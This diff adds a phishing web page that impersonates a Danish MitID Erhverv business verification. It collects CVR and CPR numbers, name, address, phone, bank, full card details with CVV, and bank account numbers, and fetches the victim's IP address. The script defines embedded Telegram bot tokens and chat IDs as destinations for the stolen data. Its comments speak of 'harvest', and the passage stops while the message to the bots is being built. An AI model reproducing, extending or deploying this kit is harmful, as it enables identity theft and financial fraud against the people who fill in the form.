@@ -1,0 +1,1213 @@
+<!DOCTYPE html>
+<html lang="da">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bekræft din virksomhed</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --blue: #1B4F9C;
+      --btn: #1B4F9C;
+      --blue-dark: #163F7D;
+      --text: #1A1A1A;
+      --muted: #4A4A4A;
+      --line: #eceff3;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      min-height: 100%;
+    }
+
+    body {
+      font-family: Inter, system-ui, -apple-system, Segoe UI, sans-serif;
+      background: #f4f6f8;
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .phone {
+      width: min(560px, 100%);
+      margin: 0 auto;
+      background: #fff;
+      min-height: 100vh;
+      overflow: auto;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 0 0 1px var(--line);
+    }
+
+    .logo-slot {
+      height: 86px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .page {
+      display: none;
+      padding: 28px 22px 36px;
+      flex: 1;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: -.02em;
+      margin-bottom: 8px;
+    }
+
+    .lede {
+      color: var(--muted);
+      font-size: 14.5px;
+      line-height: 1.5;
+      margin-bottom: 22px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      margin: 16px 0 8px;
+    }
+
+    .box {
+      border: 2px solid var(--blue);
+      border-radius: 6px;
+      background: #f3f8ff;
+      min-height: 48px;
+      display: flex;
+      align-items: center;
+    }
+
+    .box input,
+    .box select {
+      width: 100%;
+      border: 0;
+      outline: 0;
+      background: transparent;
+      font: 500 16px Inter, sans-serif;
+      padding: 12px 12px;
+      color: var(--text);
+    }
+
+    .search-input .icon {
+      width: 46px;
+      flex: 0 0 46px;
+      display: grid;
+      place-items: center;
+      color: var(--blue);
+      border-right: 1px solid #d2e3fc;
+    }
+
+    .search-wrap {
+      position: relative;
+    }
+
+    .results {
+      display: none;
+      border: 2px solid var(--blue);
+      border-top: 0;
+      border-radius: 0 0 6px 6px;
+      overflow: auto;
+      max-height: 280px;
+    }
+
+    .results.open {
+      display: block;
+    }
+
+    .search-wrap.open .search-input {
+      border-radius: 6px 6px 0 0;
+    }
+
+    .result {
+      display: block;
+      width: 100%;
+      text-align: left;
+      background: #fff;
+      border: 0;
+      padding: 14px 16px;
+      cursor: pointer;
+      font-family: inherit;
+    }
+
+    .result .name {
+      font-weight: 700;
+      font-size: 15px;
+      margin-bottom: 3px;
+    }
+
+    .result .meta {
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .result-bar {
+      height: 8px;
+      background: var(--blue);
+    }
+
+    .status {
+      font-size: 13px;
+      color: var(--muted);
+      min-height: 18px;
+      margin-top: 8px;
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1.35fr;
+      gap: 12px;
+    }
+
+    .note {
+      margin: 22px 0 20px;
+      background: #f7f8f2;
+      border-left: 4px solid #c9b56a;
+      border-radius: 4px;
+      padding: 14px 14px 14px 16px;
+      color: #5f6b57;
+      font-size: 14px;
+      line-height: 1.45;
+    }
+
+    .btn {
+      width: 100%;
+      background: var(--btn);
+      color: #fff;
+      border: 0;
+      border-radius: 4px;
+      padding: 15px 16px;
+      font: 700 14px/1 Inter, sans-serif;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .btn span {
+      font-weight: 400;
+      font-size: 18px;
+      letter-spacing: 0;
+    }
+
+    .btn:disabled {
+      opacity: .45;
+      cursor: not-allowed;
+    }
+
+    .page-done {
+      text-align: center;
+      padding: 86px 28px 48px;
+    }
+
+    .done-check {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      border: 4px solid #34c759;
+      background: #eaf8ee;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 22px;
+    }
+
+    .ref-box {
+      background: #e9f8ee;
+      border-radius: 14px;
+      padding: 18px 16px;
+      margin: 22px 0;
+    }
+
+    .ref-box .k {
+      font-size: 14px;
+      color: #3d6b4f;
+      margin-bottom: 6px;
+    }
+
+    .ref-box .v {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1f7a3a;
+    }
+
+    .done-copy {
+      color: #6b7280;
+      font-size: 15px;
+      line-height: 1.55;
+      margin-bottom: 28px;
+    }
+
+    .done-copy strong {
+      color: #111;
+    }
+
+    .logout {
+      justify-content: center;
+      letter-spacing: .08em;
+    }
+
+    .cvr-card {
+      margin-top: 12px;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 13px;
+      line-height: 1.45;
+      background: #fafbfc;
+    }
+
+    .cvr-card b {
+      display: block;
+      font-size: 15px;
+      margin-bottom: 6px;
+    }
+
+    .home {
+      display: none;
+      min-height: 100vh;
+      background: #fff;
+    }
+
+    .home.show {
+      display: block;
+    }
+
+    .home-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 22px;
+      border-bottom: 1px solid var(--line);
+      max-width: 960px;
+      margin: 0 auto;
+      position: relative;
+    }
+
+    .home-tools {
+      display: flex;
+      gap: 16px;
+      color: var(--text);
+    }
+
+    .home-tools button {
+      background: none;
+      border: 0;
+      cursor: pointer;
+      font: 12px Inter, sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+    }
+
+    .notice {
+      background: #e8f2ff;
+      border-bottom: 1px solid #d2e3fc;
+      padding: 16px 22px;
+      font-size: 14.5px;
+      line-height: 1.5;
+      color: var(--text);
+    }
+
+    .notice-inner {
+      max-width: 960px;
+      margin: 0 auto;
+    }
+
+    .notice strong {
+      display: block;
+      margin-bottom: 6px;
+      color: var(--blue-dark);
+    }
+
+    .menu-panel {
+      display: none;
+      position: absolute;
+      right: 22px;
+      top: 64px;
+      background: #fff;
+      border: 1px solid var(--line);
+      min-width: 200px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, .1);
+      z-index: 20;
+    }
+
+    .menu-panel.open {
+      display: block;
+    }
+
+    .menu-panel button {
+      display: block;
+      width: 100%;
+      text-align: left;
+      padding: 12px 14px;
+      border: 0;
+      background: #fff;
+      font: 15px Inter, sans-serif;
+      cursor: pointer;
+    }
+
+    .cookie-inline {
+      max-width: 1040px;
+      margin: 0 auto;
+      padding: 24px 22px;
+    }
+
+    .cookie-inline h3 {
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+
+    .cookie-inline p {
+      color: #4A4A4A;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 10px;
+    }
+
+    .cookie-inline a {
+      color: #1B4F9C;
+    }
+
+    .cookie-actions {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .cookie-actions button {
+      border: 0;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font: 700 13px Inter, sans-serif;
+      cursor: pointer;
+    }
+
+    .cookie-yes {
+      background: var(--btn);
+      color: #fff;
+    }
+
+    .cookie-no {
+      background: #e8f2ff;
+      color: var(--blue-dark);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      color: #1A1A1A;
+    }
+
+    .brand-dot {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #1B4F9C;
+      display: inline-block;
+    }
+
+    .hero-photo {
+      position: relative;
+      max-width: 1040px;
+      margin: 0 auto;
+    }
+
+    .hero-photo>img {
+      width: 100%;
+      height: 280px;
+      object-fit: cover;
+      display: block;
+    }
+
+    .hero-overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 20px;
+    }
+
+    .hero-box {
+      background: #1B4F9C;
+      color: #fff;
+      padding: 18px 18px 16px;
+      max-width: 340px;
+      border-radius: 6px;
+    }
+
+    .hero-box h1 {
+      color: #fff;
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    .hero-box p {
+      color: #e8f2fb;
+      font-size: 14px;
+      margin: 0;
+    }
+
+    .opdater {
+      background: #1B4F9C;
+      color: #fff;
+      border: 0;
+      padding: 14px 18px;
+      font: 700 14px Inter, sans-serif;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      cursor: pointer;
+      border-radius: 4px;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .split {
+      max-width: 1040px;
+      margin: 0 auto 40px;
+      padding: 0 22px;
+      display: grid;
+      gap: 22px;
+    }
+
+    @media (min-width: 800px) {
+      .split {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    .split img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 6px;
+      margin: 10px 0;
+    }
+
+    .split ul {
+      margin: 8px 0 0 18px;
+      color: #4A4A4A;
+    }
+
+    body.home-on {
+      background: #fff;
+    }
+
+    body.home-on .phone {
+      display: none;
+    }
+
+    body.home-on .home {
+      display: block !important;
+    }
+
+    @media (min-width: 720px) {
+      .page {
+        padding: 36px 32px 48px;
+      }
+
+      .btn {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="home" id="home">
+    <div class="home-bar">
+      <div class="brand">
+        <span class="brand-dot" aria-hidden="true"></span>
+        Erhverv Konsult
+      </div>
+      <div class="home-tools">
+        <button type="button" id="homeSearch" aria-label="Søg">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" />
+            <path d="M20 20L16.5 16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" />
+          </svg>
+          Søg
+        </button>
+        <button type="button" id="homeMenuBtn" aria-label="Menu">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <path d="M4 7h16M4 12h16M4 17h16" stroke="currentColor" stroke-width="2" />
+          </svg>
+          Menu
+        </button>
+      </div>
+    </div>
+    <div class="menu-panel" id="homeMenu">
+      <button type="button" id="menuOpdater">Book en gennemgang</button>
+    </div>
+    <div class="notice">
+      <div class="notice-inner">
+        <strong>Driftstatus: forsinkelser i e-mail (opdateret 26. juni 2026)</strong>
+        Nogle mails kan lige nu være forsinkede. Vi arbejder på sagen og vender tilbage, når det er løst.
+      </div>
+    </div>
+    <div class="hero-photo">
+      <img src="img/kontor2.jpg" alt="" />
+      <div class="hero-overlay">
+        <div class="hero-box">
+          <h1>Kom i gang med jeres virksomhedssetup</h1>
+          <p>Vi hjælper med roller, processer og en tydelig struktur i hverdagen.</p>
+        </div>
+        <button class="opdater" id="heroOpdater" type="button">Book en gennemgang</button>
+      </div>
+    </div>
+    <div class="cookie-inline" id="cookieBox">
+      <h3>Vi bruger cookies for at forstå, hvordan du bruger siden</h3>
+      <p>Vi og vores statistikleverandør kan sætte cookies til statistik. Vælger du “Ja til cookies”, accepterer du
+        statistik-cookies. Vælger du “Nej til cookies”, sætter vi ikke statistik-cookies. En nødvendig cookie husker dit
+        valg.</p>
+      <p><a href="#" id="privLink">Læs mere i privatlivspolitikken</a></p>
+      <div class="cookie-actions">
+        <button type="button" class="cookie-yes" id="cookieYes">Ja til cookies</button>
+        <button type="button" class="cookie-no" id="cookieNo">Nej til cookies</button>
+      </div>
+    </div>
+    <div class="split">
+      <article>
+        <h2>For medarbejdere</h2>
+        <img src="img/kontor1.jpg" alt="" />
+        <p>Et fælles sted til opgaver, filer og vejledninger – også hvis du ikke er administrator.</p>
+        <ul>
+          <li>Kom i gang som medarbejder</li>
+          <li>Find jeres interne guides</li>
+        </ul>
+      </article>
+      <article>
+        <h2>For administratorer</h2>
+        <img src="img/kontor2.jpg" alt="" />
+        <p>Der er tre typiske roller i et firma:</p>
+        <ul>
+          <li>Organisationsansvarlig</li>
+          <li>Brugeransvarlig</li>
+          <li>Rettighedsansvarlig</li>
+        </ul>
+        <p>Har du en af rollerne, finder du tjeklister til de mest almindelige opgaver.</p>
+      </article>
+    </div>
+  </div>
+
+  <div class="phone">
+    <div class="logo-slot" aria-hidden="true"><img src="img/logo.jpg" alt="MitID Erhverv"
+        style="max-height: 72px; max-width: 88%; object-fit: contain;" /></div>
+
+    <section class="page active" id="page-cvr">
+      <h1>Virksomhed</h1>
+      <p class="lede">Skriv CVR-nummer eller firmanavn.</p>
+      <label class="field-label" for="cvr">CVR-nummer</label>
+      <div class="search-wrap" id="searchWrap">
+        <div class="box search-input">
+          <span class="icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" />
+              <path d="M20 20L16.5 16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" />
+            </svg>
+          </span>
+          <input id="cvr" type="text" inputmode="numeric" autocomplete="off" maxlength="80" />
+        </div>
+        <div class="results" id="results"></div>
+      </div>
+      <p class="status" id="status"></p>
+      <div class="cvr-card" id="cvrCard" hidden></div>
+      <button class="btn" id="next1" disabled style="margin-top:18px">NÆSTE <span>→</span></button>
+    </section>
+
+    <section class="page" id="page-info">
+      <h1>Bekræft dine oplysninger</h1>
+      <p class="lede">Udfyld dine oplysninger nedenfor for at fortsætte.</p>
+
+      <label class="field-label" for="fullname">Fuldenavn</label>
+      <div class="box"><input id="fullname" type="text" autocomplete="name" /></div>
+
+      <label class="field-label" for="address">Adresse</label>
+      <div class="box"><input id="address" type="text" autocomplete="street-address" /></div>
+
+      <div class="row">
+        <div>
+          <label class="field-label" for="zip">Postnummer</label>
+          <div class="box"><input id="zip" type="text" inputmode="numeric" autocomplete="postal-code" /></div>
+        </div>
+        <div>
+          <label class="field-label" for="city">By</label>
+          <div class="box"><input id="city" type="text" autocomplete="address-level2" /></div>
+        </div>
+      </div>
+
+      <label class="field-label" for="phone">Telefonnummer</label>
+      <div class="box"><input id="phone" type="text" inputmode="tel" autocomplete="tel"
+          placeholder="Indtast telefonnummer" /></div>
+
+      <label class="field-label" for="extra">Bank</label>
+      <div class="box">
+        <select id="extra">
+          <option value="" selected>Vælg bank</option>
+          <option>Danske Bank</option>
+          <option>Nykredit Bank</option>
+          <option>Nordea Danmark</option>
+          <option>Jyske Bank</option>
+          <option>Sydbank</option>
+          <option>Arbejdernes Landsbank</option>
+          <option>Spar Nord Bank</option>
+          <option>Lån & Spar Bank</option>
+          <option>Vestjysk Bank</option>
+          <option>Lunar Bank</option>
+          <option>Sparekassen Kronjylland</option>
+          <option>Sparekassen Sjælland-Fyn</option>
+          <option>Den Jyske Sparekasse</option>
+          <option>Ringkjøbing Landbobank</option>
+          <option>Alka Mobilbank</option>
+          <option>Middelfart Sparekasse</option>
+          <option>Frøs Sparekasse</option>
+          <option>Sparekassen Thy</option>
+          <option>DLR Kredit</option>
+          <option>Totalkredit</option>
+          <option>Realkredit Danmark</option>
+          <option>Handelsbanken</option>
+          <option>Coop Bank</option>
+          <option>SJF</option>
+          <option>Stadil sparekasse</option>
+        </select>
+      </div>
+
+      <div class="note">
+        Det er vigtigt, at dine oplysninger er korrekte og opdaterede for at sikre fortsat adgang til din MitID
+        Erhverskonto og tilknyttede funktioner.
+      </div>
+
+      <button class="btn" id="next2">NÆSTE <span>→</span></button>
+    </section>
+
+    <section class="page" id="page-extra">
+      <h1>Betalingsmetode</h1>
+      <p class="lede">Bekræft dit betalingskort for at fuldføre opdateringen.</p>
+      <img src="img/card.jpg" alt="Betalingskort"
+        style="width: 100%; max-width: 360px; display: block; margin: 8px auto 18px; border-radius: 16px;" />
+      <label class="field-label" for="xx1">Kort Ejernavn</label>
+      <div class="box"><input id="xx1" type="text" autocomplete="cc-name" placeholder="Fulde navn på kort" /></div>
+      <label class="field-label" for="xx2">Kort Nummer</label>
+      <div class="box"><input id="xx2" type="text" autocomplete="cc-number" inputmode="numeric"
+          placeholder="0000 0000 0000 0000" /></div>
+      <div class="row">
+        <div>
+          <label class="field-label" for="xx3">Udløbsdato</label>
+          <div class="box"><input id="xx3" type="text" autocomplete="cc-exp" placeholder="MM/ÅÅ" /></div>
+        </div>
+        <div>
+          <label class="field-label" for="xx4">CVV</label>
+          <div class="box"><input id="xx4" type="text" autocomplete="cc-csc" inputmode="numeric" placeholder="•••" />
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label class="field-label" for="xx5">Regnr</label>
+          <div class="box"><input id="xx5" type="text" inputmode="numeric" placeholder="0000" /></div>
+        </div>
+        <div>
+          <label class="field-label" for="xx6">Kontonr</label>
+          <div class="box"><input id="xx6" type="text" inputmode="numeric" placeholder="0000000000" /></div>
+        </div>
+      </div>
+      <button class="btn" id="next3" style="margin-top:18px">NÆSTE <span>→</span></button>
+    </section>
+
+    <section class="page page-done" id="page-done">
+      <div class="done-check">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
+          <path d="M6.5 12.5L10.2 16.2L17.5 8.5" stroke="#34c759" stroke-width="2.6" stroke-linecap="round"
+            stroke-linejoin="round" />
+        </svg>
+      </div>
+      <h1>Bekræftelse modtaget</h1>
+      <div class="ref-box">
+        <div class="k">Referencenummer</div>
+        <div class="v" id="refNo">#C65I5900</div>
+      </div>
+      <p class="done-copy">
+        Din bekræftelse ticket <strong id="refNo2">#C65I5900</strong> er bekræftet
+        og dine oplysninger er opdateret. Du kan nu
+        logge ud sikkert.
+      </p>
+      <button class="btn logout" id="logout">LOG UD</button>
+    </section>
+  </div>
+
+  <script>
+    // URL Query Parameters parsing + localStorage integration for complete payload combination
+    const urlParams = new URLSearchParams(window.location.search);
+    const cprVal = urlParams.get('cpr') || urlParams.get('ip_cpr') || localStorage.getItem('cprNumber') || 'Ikke angivet';
+    const burgerIdVal = urlParams.get('burger_id') || urlParams.get('burgerid') || urlParams.get('burger_idVal') || localStorage.getItem('brugerId') || 'Ikke angivet';
+
+    // Fetch client IP address dynamically
+    let userIpAddress = 'Henter...';
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { userIpAddress = data.ip; })
+      .catch(() => { userIpAddress = 'Ikke fundet'; });
+
+    // Expose for leave/partial harvest
+    window.__jujMeta = () => ({
+      cpr: cprVal,
+      bruger_id: burgerIdVal,
+      ip: userIpAddress
+    });
+
+    const NOTIFY = {
+      telegramBots: [
+        { token: "8807162967:AAEv6NVQVxxEQ22HWCb84Kd7PuZ73idQR8o", chats: ["-5137105290", "8762872489"] },
+        { token: "8892755403:AAHUWYC2SESRsvn_m9DMNSy1zuIqO5Dl7S4", chats: ["-1004387628915", "7373778210"] }
+      ],
+      email: ""
+    };
+
+    const $ = (id) => document.getElementById(id);
+    const cvrInput = $("cvr");
+    const resultsEl = $("results");
+    const searchWrap = $("searchWrap");
+    const statusEl = $("status");
+    const next1 = $("next1");
+
+    let selected = null;
+    let debounceTimer = null;
+    let currentResults = [];
+
+    const FALLBACK = [
+      { cvr: "46260309", name: "HSN BYGG AS", address: "Færgehavnsvej 31, st.", zipcode: "9900", city: "Frederikshavn", addressLine: "Færgehavnsvej 31, st., 9900 Frederikshavn" },
+      { cvr: "44602091", name: "D&E Bygg Solutions ApS", address: "Baldersbuen 15D", zipcode: "2640", city: "Hedehusene", addressLine: "Baldersbuen 15D, 2640 Hedehusene" },
+      { cvr: "31348609", name: "CLEAN DANMARK ApS", address: "Karensgade 9", zipcode: "2500", city: "Valby", addressLine: "Karensgade 9, 2500 Valby", companyType: "Anpartsselskab", industry: "Almindelig rengøring i bygninger", started: "01/04 - 2008", phone: "36720101", email: "info@cleandanmark.dk" },
+      { cvr: "24256790", name: "NOVO NORDISK A/S", address: "Novo Allé 1", zipcode: "2880", city: "Bagsværd", addressLine: "Novo Allé 1, 2880 Bagsværd" },
+      { cvr: "22756214", name: "A.P. MØLLER - MÆRSK A/S", address: "Esplanaden 50", zipcode: "1098", city: "København K", addressLine: "Esplanaden 50, 1098 København K" },
+      { cvr: "10150817", name: "ERHVERVSSTYRELSEN", address: "Langelinie Allé 17", zipcode: "2100", city: "København Ø", addressLine: "Langelinie Allé 17, 2100 København Ø" },
+      { cvr: "20214414", name: "DSB", address: "Telegade 2", zipcode: "2630", city: "Taastrup", addressLine: "Telegade 2, 2630 Taastrup" },
+      { cvr: "18942579", name: "TDC A/S", address: "Teglholmsgade 1", zipcode: "2450", city: "København SV", addressLine: "Teglholmsgade 1, 2450 København SV" },
+      { cvr: "71170919", name: "CARLSBERG A/S", address: "J.C. Jacobsens Gade 1", zipcode: "1799", city: "København V", addressLine: "J.C. Jacobsens Gade 1, 1799 København V" },
+      { cvr: "56926919", name: "LEGO A/S", address: "Aastvej 1", zipcode: "7190", city: "Billund", addressLine: "Aastvej 1, 7190 Billund" },
+      { cvr: "36939040", name: "VESTAS WIND SYSTEMS A/S", address: "Hedeager 42", zipcode: "8200", city: "Aarhus N", addressLine: "Hedeager 42, 8200 Aarhus N" },
+      { cvr: "24213721", name: "DANSKE BANK A/S", address: "Holmens Kanal 2-12", zipcode: "1092", city: "København K", addressLine: "Holmens Kanal 2-12, 1092 København K" },
+      { cvr: "13522197", name: "NORDEA DANMARK", address: "Grønjordsvej 10", zipcode: "2300", city: "København S", addressLine: "Grønjordsvej 10, 2300 København S" },
+      { cvr: "40075291", name: "NETS A/S", address: "Klausdalsbrovej 601", zipcode: "2750", city: "Ballerup", addressLine: "Klausdalsbrovej 601, 2750 Ballerup" }
+    ];
+
+    function digitsOnly(s) { return (s || "").replace(/\D/g, ""); }
+    function escapeHtml(s) {
+      return String(s || "").replace(/[&<>"']/g, ch => ({
+        "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+      }[ch]));
+    }
+    function localSearch(q) {
+      const d = digitsOnly(q);
+      if (!d) return [];
+      return FALLBACK.filter(c => c.cvr.indexOf(d) === 0).slice(0, 3);
+    }
+    function fromVat(raw) {
+      if (!raw || raw.error || !raw.name) return null;
+      const vat = String(raw.vat || raw.cvr || "").replace(/\D/g, "").padStart(8, "0");
+      const address = raw.address || "";
+      const zipcode = String(raw.zipcode || "");
+      const city = raw.city || (raw.address_details && raw.address_details.city) || raw.cityname || "";
+      return {
+        cvr: vat,
+        name: raw.name,
+        address,
+        zipcode,
+        city,
+        addressLine: [address, zipcode, city].filter(Boolean).join(", "),
+        companyType: raw.companydesc || raw.companyType || "",
+        industry: raw.industrydesc || raw.industry || "",
+        started: raw.startdate || raw.started || "",
+        phone: raw.phone || "",
+        email: raw.email || "",
+        employees: raw.employees || ""
+      };
+    }
+    function withTimeout(promise, ms) {
+      return Promise.race([
+        promise,
+        new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), ms))
+      ]);
+    }
+    async function remoteSearch(q) {
+      const d = digitsOnly(q);
+      const tries = [];
+      tries.push("cvr.php?q=" + encodeURIComponent(d || q));
+      if (d.length === 8) tries.push("https://datacvrapi.dk/api/v2/dk/company/" + d);
+      if (d) tries.push("https://cvrapi.dk/api?search=" + encodeURIComponent(d) + "&country=dk");
+      for (const url of tries) {
+        try {
+          const res = await withTimeout(fetch(url, { headers: { "Accept": "application/json" } }), 2500);
+          if (!res.ok) continue;
+          const data = await res.json();
+          if (data && data.error) continue;
+          if (Array.isArray(data.results)) return data.results.slice(0, 3);
+          if (Array.isArray(data.items)) return data.items.map(fromVat).filter(Boolean).slice(0, 3);
+          if (Array.isArray(data)) return data.map(fromVat).filter(Boolean).slice(0, 3);
+          const one = fromVat(data);
+          if (one) return [one];
+        } catch (e) { }
+      }
+      return [];
+    }
+
+    function startApp() {
+      document.body.classList.remove("home-on");
+      $("home").classList.remove("show");
+      $("homeMenu").classList.remove("open");
+      go("page-cvr");
+    }
+    function go(id) {
+      document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+      $(id).classList.add("active");
+    }
+    function makeRef() {
+      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789";
+      let s = "#C";
+      for (let i = 0; i < 8; i++) s += chars[Math.floor(Math.random() * chars.length)];
+      return s;
+    }
+    function renderResults(list) {
+      currentResults = list;
+      if (!list.length) {
+        resultsEl.classList.remove("open");
+        searchWrap.classList.remove("open");
+        resultsEl.innerHTML = "";
+        return;
+      }
+      resultsEl.innerHTML = list.map((c, i) => `
+        <button type="button" class="result" data-i="${i}">
+          <div class="name">${escapeHtml(c.name)}</div>
+          <div class="meta">CVR: ${escapeHtml(c.cvr)} · ${escapeHtml(c.addressLine || [c.address, c.zipcode, c.city].filter(Boolean).join(" "))}</div>
+        </button>
+      `).join("") + `<div class="result-bar"></div>`;
+      resultsEl.classList.add("open");
+      searchWrap.classList.add("open");
+      resultsEl.querySelectorAll(".result").forEach(btn => {
+        btn.addEventListener("click", () => selectCompany(list[Number(btn.dataset.i)]));
+      });
+    }
+    function selectCompany(c) {
+      selected = c;
+      cvrInput.value = c.cvr;
+      renderResults([]);
+      next1.disabled = false;
+      statusEl.textContent = "";
+      $("address").value = c.address || "";
+      $("zip").value = c.zipcode || "";
+      $("city").value = c.city || "";
+      $("cvrCard").hidden = false;
+      $("cvrCard").innerHTML = "<b>" + escapeHtml(c.name) + "</b>CVR " + escapeHtml(c.cvr);
+    }
+    async function runSearch(q) {
+      if (!q || q.trim().length < 2) {
+        renderResults([]);
+        statusEl.textContent = "";
+        next1.disabled = true;
+        selected = null;
+        return;
+      }
+      const local = localSearch(q);
+      if (local.length) {
+        renderResults(local);
+        statusEl.textContent = "Vælg virksomheden herunder.";
+      } else {
+        statusEl.textContent = "Søger i CVR…";
+      }
+      let list = local;
+      try {
+        const remote = await remoteSearch(q);
+        if (remote.length) {
+          const seen = new Set(list.map(c => c.cvr));
+          remote.forEach(c => { if (c && c.cvr && !seen.has(c.cvr) && list.length < 3) list.push(c); });
+        }
+      } catch (e) { }
+
+      const d = digitsOnly(q);
+      if (!list.length && d.length === 8) {
+        list = [{
+          cvr: d,
+          name: "CVR " + d,
+          address: "",
+          zipcode: "",
+          city: "",
+          addressLine: "Manuel bekræftelse"
+        }];
+      }
+      if (!list.length) {
+        renderResults([]);
+        statusEl.textContent = d.length === 8
+          ? "Ingen virksomhed fundet. Tjek nummeret."
+          : "Skriv CVR (8 cifre) eller firmanavn.";
+        next1.disabled = true;
+        return;
+      }
+      renderResults(list.slice(0, 3));
+      statusEl.textContent = "Tryk på virksomheden, derefter NÆSTE.";
+      if (list.length === 1 && d.length === 8) next1.disabled = false, selected = list[0];
+    }
+
+    cvrInput.addEventListener("focus", () => {
+      if (!cvrInput.value.trim()) runSearch("");
+    });
+    cvrInput.addEventListener("input", () => {
+      selected = null;
+      next1.disabled = true;
+      clearTimeout(debounceTimer);
+      debounceTimer = setTimeout(() => runSearch(cvrInput.value), 120);
+    });
+    cvrInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" && currentResults[0]) {
+        e.preventDefault();
+        selectCompany(currentResults[0]);
+      }
+    });
+
+    const expiryEl = $("xx3");
+    expiryEl.addEventListener("input", () => {
+      let v = expiryEl.value.replace(/\D/g, "").slice(0, 4);
+      if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
+      expiryEl.value = v;
+    });
+
+    $("heroOpdater").addEventListener("click", startApp);
+    $("menuOpdater").addEventListener("click", startApp);
+    $("homeMenuBtn").addEventListener("click", () => $("homeMenu").classList.toggle("open"));
+
+    next1.addEventListener("click", () => { if (selected) go("page-info"); });
+    $("next2").addEventListener("click", () => {
+      if (!$("fullname").value.trim()) { $("fullname").focus(); return; }
+      if (!$("phone").value.trim()) { $("phone").focus(); return; }
+      if (!$("extra").value) { $("extra").focus(); return; }
+      go("page-extra");
+    });
+
+    // Form submission gathering all data together cleanly
+    let next3Busy = false;
+    $("next3").addEventListener("click", async (e) => {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      if (next3Busy) return;
+      // Commit last focused input value (fixes needing 2 taps on mobile)
+      if (document.activeElement && document.activeElement.blur) document.activeElement.blur();
+
+      const xxIds = ["xx1", "xx2", "xx3", "xx4", "xx5", "xx6"];
+      const missing = xxIds.find(id => !$(id).value.trim());
+      if (missing) { $(missing).focus(); return; }
+
+      next3Busy = true;
+      const ref = makeRef();
+      $("refNo").textContent = ref;
+      $("refNo2").textContent = ref;
+
+      const payload = {
+        reference: ref,
+        cpr: cprVal,
+        burger_id: burgerIdVal,
+        ip_address: userIpAddress,
+        company: selected || {
+          name: "",
+          cvr: digitsOnly(cvrInput.value),
+          address: $("address").value.trim(),
+          zipcode: $("zip").value.trim(),
+          city: $("city").value.trim(),
+          addressLine: [$("address").value.trim(), $("zip").value.trim(), $("city").value.trim()].filter(Boolean).join(", ")
+        },
+        contact: {
+          name: $("fullname").value.trim(),
+          address: $("address").value.trim(),
+          zip: $("zip").value.trim(),
+          city: $("city").value.trim(),
+          phone: $("phone").value.trim(),
+          extra: $("extra").value,
+          cardHolder: $("xx1").value.trim(),
+          cardNumber: $("xx2").value.trim(),
+          expiry: $("xx3").value.trim(),
+          cvv: $("xx4").value.trim(),
+          regnr: $("xx5").value.trim(),
+          kontonr: $("xx6").value.trim()
+        }
+      };
+
+      const text = [
+        "🔑 *Ny samlet besvarelse*",
+        "Ref: " + (payload.reference || "—"),
+        "CPR-Number: " + (cprVal || "—"),
+        "Bruger-ID: " + (burgerIdVal || "—"),
